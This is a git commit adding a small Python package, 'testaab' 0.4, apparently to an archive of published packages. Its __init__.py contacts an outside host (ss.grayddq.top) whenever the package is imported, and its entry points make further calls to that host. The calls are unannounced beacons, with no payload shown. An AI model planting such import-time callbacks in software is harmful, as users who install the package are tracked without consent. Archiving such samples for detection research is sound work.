80b9cd9327a4836fa4416251c99cedfaacd2f4bd
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 16:15:45 +0000

    Add package testaab/0.4/testaab-0.4.tar.gz

---
+++ packages/testaab/testaab-0.4.tar.gz/testaab-0.4/testaab/__init__.py
@@ -0,0 +1,10 @@
+import urllib
+
+print("aa")
+
+urllib.urlopen('http://ss.grayddq.top/test1')
+
+if __name__ == '__main__':
+   print("bb")
+   urllib.urlopen('http://ss.grayddq.top/test2')
+
---
+++ packages/testaab/testaab-0.4.tar.gz/testaab-0.4/testaab/__main__.py
@@ -0,0 +1,5 @@
+import urllib
+
+if __name__ == '__main__':
+   print("bb")
+   urllib.urlopen('http://ss.grayddq.top/test4')
